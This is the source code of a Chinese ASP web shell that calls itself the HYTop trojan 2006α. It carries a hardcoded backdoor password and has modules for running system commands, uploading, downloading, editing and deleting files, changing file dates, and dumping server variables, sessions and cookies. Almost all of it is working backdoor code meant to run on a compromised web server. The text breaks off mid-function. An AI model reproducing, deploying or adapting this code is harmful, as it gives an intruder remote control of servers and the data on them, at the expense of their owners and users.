<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<object runat="server" id="sa" scope="page" classid="clsid:13709620-C279-11CE-A49E-444553540000"></object>
<%
'	Option Explicit

	Dim sTime, aspPath, pageName

	sTime = Timer
	pageName = Request("pageName")
	aspPath = Replace(Server.MapPath(".") & "\~86.tmp", "\\", "\") ''系统临时文件
	
	Const m = "HYTop2006α"					''自定义Session前缀
	Const myName = "打开"		''登录页按扭上的文字
	Const isDebugMode = False				''是否显示完整错误信息
	Const clientPassword = "Skull1937"				''插入后门的密码,如果要插入数据库中,只能为一个字符.
	Const notdownloadsExists = False		''原ACCESS数据库中是否存在notdownloadsExists表
	Const myCmdDotExeFile = "command.com"	''定义cmd.exe文件的文件名
	Const userPassword = "Skull1937"		''管理密码
	Const showLogin = ""					''为空直接显示登录界面,否则用"?pageName=它的值"来进行访问
	Const strJsCloseMe = "<input type=button value=' 关闭 ' onclick='window.close();'>"

	Sub chkErr(Err)
		If Err Then
			echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"
			echo "<br/><font size=2><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><br/>"
			echo "<hr>Powered By Marcos 2005.02</font>"
			Err.Clear
			Response.End
		End If
	End Sub
	
	Sub echo(str)
		Response.Write(str)
	End Sub
	
	Sub isIn()
		If pageName <> "" And PageName <> "login" And PageName <> showLogin Then
			If Session(m & "userPassword") <> userPassword Then
				Response.End
			End If
		End If
	End Sub
	
	Sub showTitle(str)
		echo "<title>" & str & " - 海阳顶端网ASP木马2006α - By Marcos & LCX</title>" & vbNewLine
		echo "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbNewLine
		echo "<!--getTerminalInfo()代码原型来自kEvin1986-->" & vbNewLine
		echo "<!--本版部分图标资源来自COCOON, 感谢Sunrise_Chen-->" & vbNewLine
		echo "<!--感谢:网辰在线、化境编程、桂林老兵、冰狐浪子、蓝屏、小路、wangyong、czy、allen、lcx、Marcos、kEvin1986对海阳顶端网asp木马所做的一切努力-->" & vbNewLine
		PageOther()
	End Sub
	
	Function fixNull(str)
		If IsNull(str) Then
			str = " "
		End If
		fixNull = str
	End Function
	
	Function encode(str)
		str = Server.HTMLEncode(str)
		str = Replace(str, vbNewLine, "<br>")
		str = Replace(str, " ", "&nbsp;")
		str = Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;")
		encode = str
	End Function
	
	Function getTheSize(theSize)
		If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G"
		If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M"
		If theSize >= 1024 And theSize < (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 & "K"
		If theSize >= 0 And theSize <1024 Then getTheSize = theSize & "B"
	End Function
	
	Sub showExecuteTime()
		Response.Write "" & (Timer() - sTime) * 1000 & " ms"
	End Sub
	
	Function HtmlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		HtmlEncode = Server.HTMLEncode(str)
	End Function
	
	Function UrlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		UrlEncode = Server.UrlEncode(str)
	End Function
	
	Sub redirectTo(strUrl)
		Response.Redirect(Request.ServerVariables("URL") & strUrl)
	End Sub

	Function trimThePath(strPath)
		If Right(strPath, 1) = "\" And Len(strPath) > 3 Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		trimThePath = strPath
	End Function

	Sub alertThenClose(strInfo)
		Response.Write "<script>alert(""" & strInfo & """);window.close();</script>"
	End Sub

	Sub showErr(str)
		Dim i, arrayStr
		str = Server.HtmlEncode(str)
		arrayStr = Split(str, "$$")
'		Response.Clear
		echo "<font size=2>"
		echo "出错信息:<br/><br/>"
		For i = 0 To UBound(arrayStr)
			echo "&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<br/>"
		Next
		echo "</font>"
		Response.End
	End Sub

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
	Rem     下面是程序模块选择部分
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


	isIn()

	Select Case pageName
		Case showLogin, "login"
			PageLogin()
		Case "PageList"
			PageList()
		Case "objOnSrv"
			PageObjOnSrv()
		Case "ServiceList"
			PageServiceList()
		Case "userList"
			PageUserList()
		Case "CSInfo"
			PageCSInfo()
		Case "infoAboutSrv"
			PageInfoAboutSrv()
		Case "AppFileExplorer"
			PageAppFileExplorer()
		Case "SaCmdRun"
			PageSaCmdRun()
		Case "WsCmdRun"
			PageWsCmdRun()
		Case "FsoFileExplorer"
			PageFsoFileExplorer()
		Case "MsDataBase"
			PageMsDataBase()
		Case "OtherTools"
			PageOtherTools()
		Case "TxtSearcher"
			PageTxtSearcher()
	End Select

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	Rem 	下面是各独立功能模块
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

	Sub PageAppFileExplorer()
		Response.Buffer = True
		Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
		Dim intI, theAct, strFolderList, strFileList, strFilePath, strFileName, strParentPath

		showTitle("Shell.Application文件浏览器(&stream)")

		theAct = Request("theAct")
		strNewName = Request("newName")
		thePath = Replace(LTrim(Request("thePath")), "\\", "\")
		
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Replace(LTrim(Request.Form("thePath")), "\\", "\")
			End If
		End If

		echo "<style>body{margin:8;}</style>"
		
		Select Case theAct
			Case "openUrl"
				openUrl(thePath)
			Case "showEdit"
				Call showEdit(thePath, "stream")
			Case "saveFile"
				Call saveToFile(thePath, "stream")
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("参数错误!")
					Response.End
				End If
				Session(m & "appThePath") = thePath
				Session(m & "appTheAct") = theAct
				alertThenClose("操作成功,请粘贴!")
			Case "pastOne"
				appDoPastOne(thePath)
				alertThenClose("粘贴成功,请刷新本页查看效果!")
			Case "rename"
				appRenameOne(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "theAttributes"
				appTheAttributes(thePath)
			Case "showUpload"
				Call showUpload(thePath, "AppFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "AppFileExplorer")
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		
		Set objFolder = sa.NameSpace(thePath)
		
		If Request.Form.Count > 0 Then
			redirectTo("?pageName=AppFileExplorer&thePath=" & UrlEncode(thePath))
		End If
		echo "<input type=hidden name=usePath /><input type=hidden value=AppFileExplorer name=pageName />"
		echo "<input type=hidden value=""" & HtmlEncode(thePath) & """ name=truePath />"
		echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "<input type=button value=' 打开 ' onclick='openUrl();'>"
		echo "<input type=button value=' 编辑 ' onclick='editFile();'>"
		echo "<input type=button value=' 复制 ' onclick=appDoAction('copyOne');>"
		echo "<input type=button value=' 剪切 ' onclick=appDoAction('cutOne');>"
		echo "<input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne');>"
		echo "<input type=button value=' 上传 ' onclick='upTheFile();'>"
		echo "<input type=button value=' 下载 ' onclick='downTheFile();'>"
		echo "<input type=button value=' 属性 ' onclick='appTheAttributes();'>"
		echo "<input type=button value='重命名' onclick='appRename();'>"
		echo "<input type=button value='我的电脑' onclick=location.href='?pageName=AppFileExplorer&thePath='>"
		echo "<input type=button value='控制面板' onclick=location.href='?pageName=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>"
		echo "<form method=post action='?pageName=AppFileExplorer'>"
		echo "<input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' />"
		echo "<input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' />"
		echo "<input type=button value=站点根 onclick=location.href=""?pageName=AppFileExplorer&thePath=" & URLEncode(Server.MapPath("\")) & """;>"
		echo "<input style='width:60%;' name=thePath value=""" & HtmlEncode(thePath) & """ />"
		echo "<input type=submit value=' GO.' /><input type=button value=' 刷新 ' onclick='location.reload();'></form><hr/>"
		echo "</div><div style='height:50px;'></div>"
		echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

		For Each objMember In objFolder.Items
			intI = intI + 1
			If intI > 200 Then
				intI = 0
				Response.Flush()
			End If
			
			If objMember.IsFolder = True Then
				If Left(objMember.Path, 2) = "::" Then
					strPath = URLEncode(objMember.Path)
				 Else
					strPath = URLEncode(objMember.Path) & "%5C"
				End If
				strFolderList = strFolderList & "<span id=""" & strPath & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>" & objMember.Name & "</span>"
			 Else
			 	strDetails = objFolder.GetDetailsOf(objMember, -1)
			 	strFilePath = objMember.Path
				strFileName = Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
				strExtName = Split(strFileName, ".")(UBound(Split(strFileName, ".")))
				strFileList = strFileList & "<span title=""" & strDetails & """ ondblclick='openUrl();' id=""" & URLEncode(strFilePath) & """ onclick='changeMyClass(this);'><font class=font face=" & getFileIcon(strExtName) & "</font><br/>" & strFileName & "</span>"
			End If
		Next

		strParentPath = getParentPath(thePath)
		If thePath <> "" And Left(thePath, 2) <> "::" Then
			strFolderList = "<span id=""" & URLEncode(strParentPath) & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>..</span>" & strFolderList
		End If

		echo "<div id=FileList>"
		echo strFolderList & strFileList
		echo "</div>"
		echo "<hr/>Powered By Marcos 2005.02"
		
		Set objFolder = Nothing
	End Sub
	
	Function getParentPath(strPath)
		If Right(strPath, 1) = "\" Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		If Len(strPath) = 2 Then
			getParentPath = " "
		 Else
			getParentPath = Left(strPath, InStrRev(strPath, "\"))
		End If
	End Function

	Function streamSaveToFile(thePath, fileContent)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			chkErr(Err)
			.Charset="gb2312"
			.WriteText fileContent
			.saveToFile thePath, 2
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub appDoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strAct, strPath
		dim objTargetFolder
		strAct = Session(m & "appTheAct")
		strPath = Session(m & "appThePath")
		
		If strAct = "" Or strPath = "" Then
			alertThenClose("参数错误,粘贴前请先复制/剪切!")
			Exit Sub
		End If
		
		If InStr(LCase(thePath), LCase(strPath)) > 0 Then
			alertThenClose("目标文件夹在源文件夹内,非法操作!")
			Exit Sub
		End If

		strPath = trimThePath(strPath)
		thePath = trimThePath(thePath)

		Set objTargetFolder = sa.NameSpace(thePath)
		If strAct = "copyOne" Then
			objTargetFolder.CopyHere(strPath)
		 Else
			objTargetFolder.MoveHere(strPath)
		End If
		chkErr(Err)
		
		Set objTargetFolder = Nothing
	End Sub
	
	Sub appTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, strSth, objFolder, objItem, strModifyDate
		strModifyDate = Request("ModifyDate")
		
		thePath = trimThePath(thePath)

		If thePath = "" Then
			alertThenClose("没有选择任何文件(夹)!")
			Exit Sub
		End If

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = sa.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)

		If isDate(strModifyDate) Then
			objItem.ModifyDate = strModifyDate
			alertThenClose("修改成功!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
'		strSth = objFolder.GetDetailsOf(objItem, -1)
'		strSth = Replace(strSth, chr(10), "<br/>")
		For i = 1 To 8
			strSth = strSth & "<br/>属性(" & i & "): " & objFolder.GetDetailsOf(objItem, i)
		Next
		strSth = Replace(strSth, "属性(1)", "大小")
		strSth = Replace(strSth, "属性(2)", "类型")
		strSth = Replace(strSth, "属性(3)", "最后修改")
		strSth = Replace(strSth, "属性(8)", "所有者")
		strSth = strSth & "<form method=post>"
		strSth = strSth & "<input type=hidden name=theAct value=theAttributes>"
		strSth = strSth & "<input type=hidden name=thePath value=""" & thePath & """>"
		strSth = strSth & "<br/>最后修改: <input size=30 value='" & objFolder.GetDetailsOf(objItem, 3) & "' name=ModifyDate />"
		strSth = strSth & "<input type=submit value=' 修改 '>"
		strSth = strSth & "</form>"
		echo strSth
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub
	
	Sub appRenameOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strSth, fileName, objItem, objFolder
		fileName = Request("fileName")
		
		thePath = trimThePath(thePath)

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = sa.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)
		strSth = Split(thePath, ".")(UBound(Split(thePath, ".")))
		
		If fileName <> "" Then
			objItem.Name = fileName
			chkErr(Err)
			alertThenClose("重命名成功,刷新本页可以看到效果!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
		echo "<form method=post>重命名:"
		echo "<input type=hidden name=theAct value=rename>"
		echo "<input type=hidden name=thePath value=""" & thePath & """>"
		echo "<br/><input size=30 value=""" & objItem.Name & """ name=fileName />"
		If InStr(strSth, ":") <= 0 Then
			echo "." & strSth
		End If
		echo "<hr/><input type=submit value=' 修改 '>" & strJsCloseMe
		echo "</form>"
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub

	Sub PageCSInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strKey, strVar, strVariable
		
		showTitle("客户端服务器交互信息")
		
		echo "<a href=javascript:showHideMe(ServerVariables);>ServerVariables:</a>"
		echo "<span id=ServerVariables style='display:none;'>"
		For Each strVariable In Request.ServerVariables
			echo "<li>" & strVariable & ": " & Request.ServerVariables(strVariable) & "</li>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(Application);>Application:</a>"
		echo "<span id=Application style='display:none;'>"
		For Each strVariable In Application.Contents
			echo "<li>" & strVariable & ": " & Encode(Application(strVariable)) & "</li>"
			If Err Then
				For Each strVar In Application.Contents(strVariable)
					echo "<li>" & strVariable & "(" & strVar & "): " & Encode(Application(strVariable)(strVar)) & "</li>"
				Next
				Err.Clear
			End If
		Next
		echo "</span>"

		echo "<br/><a href=javascript:showHideMe(Session);>Session:(ID" & Session.SessionId & ")</a>"
		echo "<span id=Session style='display:none;'>"
		For Each strVariable In Session.Contents
			echo "<li>" & strVariable & ": " & Encode(Session(strVariable)) & "</li>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(Cookies);>Cookies:</a>"
		echo "<span id=Cookies style='display:none;'>"
		For Each strVariable In Request.Cookies
			If Request.Cookies(strVariable).HasKeys Then
				For Each strKey In Request.Cookies(strVariable)
					echo "<li>" & strVariable & "(" & strKey & "): " & HtmlEncode(Request.Cookies(strVariable)(strKey)) & "</li>"
				Next
			 Else
				echo "<li>" & strVariable & ": " & Encode(Request.Cookies(strVariable)) & "</li>"
			End If
		Next
		echo "</span><hr/>Powered By Marcos 2005.02"
		
	End Sub

	Sub PageFsoFileExplorer()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Response.Buffer = True
		Dim file, drive, folder, theFiles, theFolder, theFolders
		Dim i, theAct, strTmp, driveStr, thePath, parentFolderName
		
		theAct = Request("theAct")
		thePath = Request("thePath")
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Request.Form("thePath")
			End If
		End If

		showTitle("FSO文件浏览器(&stream)")
		
		Select Case theAct
			Case "newOne", "doNewOne"
				fsoNewOne(thePath)
			Case "showEdit"
				Call showEdit(thePath, "fso")
			Case "saveFile"
				Call saveToFile(thePath, "fso")
			Case "openUrl"
				openUrl(thePath)
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("参数错误!")
					Response.End
				End If
				Session(m & "fsoThePath") = thePath
				Session(m & "fsoTheAct") = theAct
				alertThenClose("操作成功,请粘贴!")
			Case "pastOne"
				fsoPastOne(thePath)
				alertThenClose("粘贴成功,请刷新本页查看效果!")
			Case "showFsoRename"
				showFsoRename(thePath)
			Case "doRename"
				Call fsoRename(thePath)
				alertThenClose("重命名成功,刷新后可以看到效果!")
			Case "delOne", "doDelOne"
				showFsoDelOne(thePath)
			Case "getAttributes", "doModifyAttributes"
				fsoTheAttributes(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "showUpload"
				Call showUpload(thePath, "FsoFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "FsoFileExplorer")
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		If Request.Form.Count > 0 Then
			redirectTo("?pageName=FsoFileExplorer&thePath=" & UrlEncode(thePath))
		End If
		
		parentFolderName = fso.GetParentFolderName(thePath)
		
		echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "<input type=button value=' 新建 ' onclick=newOne();>"
		echo "<input type=button value=' 更名 ' onclick=fsoRename();>"
		echo "<input type=button value=' 编辑 ' onclick=editFile();>"
		echo "<input type=button value=' 打开 ' onclick=openUrl();>"
		echo "<input type=button value=' 复制 ' onclick=appDoAction('copyOne');>"
		echo "<input type=button value=' 剪切 ' onclick=appDoAction('cutOne');>"
		echo "<input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne')>"
		echo "<input type=button value=' 属性 ' onclick=fsoGetAttributes();>"
		echo "<input type=button value=' 删除 ' onclick=delOne();>"
		echo "<input type=button value=' 上传 ' onclick='upTheFile();'>"
		echo "<input type=button value=' 下载 ' onclick='downTheFile();'>"
		echo "<br/>"
		echo "<input type=hidden value=FsoFileExplorer name=pageName />"
		echo "<input type=hidden value=""" & UrlEncode(thePath) & """ name=truePath>"
		echo "<input type=hidden size=50 name=usePath>"

		echo "<form method=post action=?pageName=FsoFileExplorer>"
		If parentFolderName <> "" Then
			echo "<input value='↑向上' type=button onclick=""this.disabled=true;location.href='?pageName=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"
		End If
		echo "<input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' />"
		echo "<input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' />"
		echo "<input size=60 value=""" & HtmlEncode(thePath) & """ name=thePath>"
		echo "<input type=submit value=' 转到 '>"
		driveStr = "<option>盘符</option>"
		driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath(".")) & "'>.</option>"
		driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath("/")) & "'>/</option>"
		For Each drive In fso.Drives
			driveStr = driveStr & "<option value='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</option>"
		Next
		echo "<input type=button value=' 刷新 ' onclick='location.reload();'> "
		echo "<select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" & driveStr & "</select>"
		echo "<hr/></form>"
		echo "</div><div style='height:50px;'></div>"
		echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

		If fso.FolderExists(thePath) = False Then
			showErr(thePath & " 目录不存在或者不允许访问!")
		End If
		Set theFolder = fso.GetFolder(thePath)
		Set theFiles = theFolder.Files
		Set theFolders = theFolder.SubFolders

		echo "<div id=FileList>"
		For Each folder In theFolders
			i = i + 1
			If i > 50 Then
				i = 0
				Response.Flush()
			End If
			strTmp = UrlEncode(folder.Path & "\")
			echo "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>" & folder.Name & "</span>" & vbNewLine
		Next
		Response.Flush()
		For Each file In theFiles
			i = i + 1
			If i > 100 Then
				i = 0
				Response.Flush()
			End If
			echo "<span id='" & UrlEncode(file.Path) & "' title='类型: " & file.Type & vbNewLine & "大小: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face=" & getFileIcon(fso.GetExtensionName(file.Name)) & "</font><br/>" & file.Name & "</span>" & vbNewLine
		Next
		echo "</div>"
		chkErr(Err)
		
		echo "<hr/>Powered By Marcos 2005.02"
	End Sub
	
	Sub fsoNewOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theAct, isFile, theName, newAct
		isFile = Request("isFile")
		newAct = Request("newAct")
		theName = Request("theName")

		If newAct = " 确定 " Then
			thePath = Replace(thePath & "\" & theName, "\\", "\")
			If isFile = "True" Then
				Call fso.CreateTextFile(thePath, False)
			 Else
				fso.CreateFolder(thePath)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)新建成功,刷新后就可以看到效果!")
			Response.End
		End If
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>新建: "
		echo "<input type=radio name=isFile id=file value='True' checked><label for=file>文件</label> "
		echo "<input type=radio name=isFile id=folder value='False'><label for=folder>文件夹</label><br/>"
		echo "<input size=38 name=theName><hr/>"
		echo "<input type=hidden name=theAct value=doNewOne>"
		echo "<input type=submit name=newAct value=' 确定 '>" & strJsCloseMe
		echo "</form>"
		echo "</body><br/>"
	End Sub
	
	Sub fsoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim sessionPath
		sessionPath = Session(m & "fsoThePath")
		
		If thePath = "" Or sessionPath = "" Then
			alertThenClose("参数错误!")
			Response.End
		End If
		
		If Right(thePath, 1) = "\" Then
			thePath = Left(thePath, Len(thePath) - 1)
		End If
		
		If Right(sessionPath, 1) = "\" Then
			sessionPath = Left(sessionPath, Len(sessionPath) - 1)
			If Session(m & "fsoTheAct") = "cutOne" Then
				Call fso.MoveFolder(sessionPath, thePath & "\" & fso.GetFileName(sessionPath))
			 Else
				Call fso.CopyFolder(sessionPath, thePath & "\" & fso.GetFileName(sessionPath))
			End If
		 Else
			If Session(m & "fsoTheAct") = "cutOne" Then
				Call fso.MoveFile(sessionPath, thePath & "\" & fso.GetFileName(sessionPath))
			 Else
				Call fso.CopyFile(sessionPath, thePath & "\" & fso.GetFileName(sessionPath))
			End If
		End If
		
		chkErr(Err)
	End Sub
	
	Sub fsoRename(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, fileName, theFolder
		fileName = Request("fileName")
		
		If thePath = "" Or fileName = "" Then
			alertThenClose("参数错误!")
			Response.End
		End If

		If Right(thePath, 1) = "\" Then
			Set theFolder = fso.GetFolder(thePath)
			theFolder.Name = fileName
			Set theFolder = Nothing
		 Else
			Set theFile = fso.GetFile(thePath)
			theFile.Name = fileName
			Set theFile = Nothing
		End If
		
		chkErr(Err)
	End Sub
	
	Sub showFsoRename(thePath)
		Dim theAct, fileName
		fileName = fso.getFileName(thePath)
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>更名为:<br/>"
		echo "<input size=38 name=fileName value=""" & HtmlEncode(fileName) & """><hr/>"
		echo "<input type=submit value=' 确定 '>"
		echo "<input type=hidden name=theAct value=doRename>"
		echo "<input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "</form>"
		echo "</body><br/>"
	End Sub
	
	Sub showFsoDelOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile
		newAct = Request("newAct")

		If newAct = "确认删除?" Then
			If Right(thePath, 1) = "\" Then
				thePath = Left(thePath, Len(thePath) - 1)
				Call fso.DeleteFolder(thePath, True)
			 Else
				Call fso.DeleteFile(thePath, True)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)删除成功,刷新后就可以看到效果!")
			Response.End
		End If

		echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"		
		echo "<form method=post><br/>"
		echo HtmlEncode(thePath)
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doDelOne>"
		echo "<hr/><input type=submit name=newAct value='确认删除?'><input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "</form>"
	End Sub
	
	Sub fsoTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile, theFolder, theTitle
		newAct = Request("newAct")
		
		If Right(thePath, 1) = "\" Then
			Set theFolder = fso.GetFolder(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFolder)
			End If
				theTitle = getMyTitle(theFolder)
			Set theFolder = Nothing
		 Else
			Set theFile = fso.GetFile(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFile)
			End If
			theTitle = getMyTitle(theFile)
			Set theFile = Nothing
		End If
		
		chkErr(Err)
		theTitle = Replace(theTitle, vbNewLine, "<br/>")
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doModifyAttributes>"
		echo theTitle
		echo "<hr/><input type=submit name=newAct value=' 修改 '>" & strJsCloseMe
		echo "</form>"
	End Sub
	
	Function getMyTitle(theOne)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strTitle
		strTitle = strTitle & "路径: &quot;" & theOne.Path & "&quot;" & vbNewLine
		strTitle = strTitle & "大小: " & getTheSize(theOne.Size) & vbNewLine
		strTitle = strTitle & "属性: " & getAttributes(theOne.Attributes) & vbNewLine
		strTitle = strTitle & "创建时间: " & theOne.DateCreated & vbNewLine
		strTitle = strTitle & "最后修改: " & theOne.DateLastModified & vbNewLine
		strTitle = strTitle & "最后访问: " & theOne.DateLastAccessed
		getMyTitle = strTitle
	End Function
	
	Sub setMyTitle(theOne)
		Dim i, myAttributes
		
		For i = 1 To Request("attributes").Count
			myAttributes = myAttributes + CInt(Request("attributes")(i))
		Next
		theOne.Attributes = myAttributes
		
		chkErr(Err)
		echo  "<script>alert('该文件(夹)属性已按正确设置修改完成!');</script>"
	End Sub
	
	Function getAttributes(intValue)
		Dim strAtt
		strAtt = "<input type=checkbox name=attributes value=4 {$system}>系统 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=2 {$hidden}>隐藏 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=1 {$readonly}>只读&nbsp;&nbsp;&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=32 {$archive}>存档<br/>　　&nbsp; "
		strAtt = strAtt & "<input type=checkbox name=attributes {$normal} value=0>普通 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=128 {$compressed}>压缩 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=16 {$directory}>文件夹&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=64 {$alias}>快捷方式"
'		strAtt = strAtt & "<input type=checkbox name=attributes value=8 {$volume}>卷标 "
		If intValue = 0 Then
			strAtt = Replace(strAtt, "{$normal}", "checked")
		End If
		If intValue >= 128 Then
			intValue = intValue - 128
			strAtt = Replace(strAtt, "{$compressed}", "checked")
		End If
		If intValue >= 64 Then
			intValue = intValue - 64
			strAtt = Replace(strAtt, "{$alias}", "checked")
		End If
		If intValue >= 32 Then
			intValue = intValue - 32
			strAtt = Replace(strAtt, "{$archive}", "checked")
		End If
		If intValue >= 16 Then
			intValue = intValue - 16
			strAtt = Replace(strAtt, "{$directory}", "checked")
		End If
		If intValue >= 8 Then
			intValue = intValue - 8
			strAtt = Replace(strAtt, "{$volume}", "checked")
		End If
		If intValue >= 4 Then
			intValue = intValue - 4
			strAtt = Replace(strAtt, "{$system}", "checked")
		End If
		If intValue >= 2 Then
			intValue = intValue - 2
			strAtt = Replace(strAtt, "{$hidden}", "checked")
		End If
		If intValue >= 1 Then
			intValue = intValue - 1
			strAtt = Replace(strAtt, "{$readonly}", "checked")
		End If
		getAttributes = strAtt
	End Function

	Sub PageInfoAboutSrv()
		Dim theAct
		theAct = Request("theAct")
		
		showTitle("服务器相关数据")
		
		Select Case theAct
			Case ""
				getSrvInfo()
				getSrvDrvInfo()
				getSiteRootInfo()
				getTerminalInfo()
			Case "getSrvInfo"
				getSrvInfo()
			Case "getSrvDrvInfo"
				getSrvDrvInfo()
			Case "getSiteRootInfo"
				getSiteRootInfo()
			Case "getTerminalInfo"
				getTerminalInfo()
		End Select
		
		echo "<hr/>Powered By Marcos 2005.02"
	End Sub

	Sub getSrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
		Set sa = Server.CreateObject("Shell.Application")
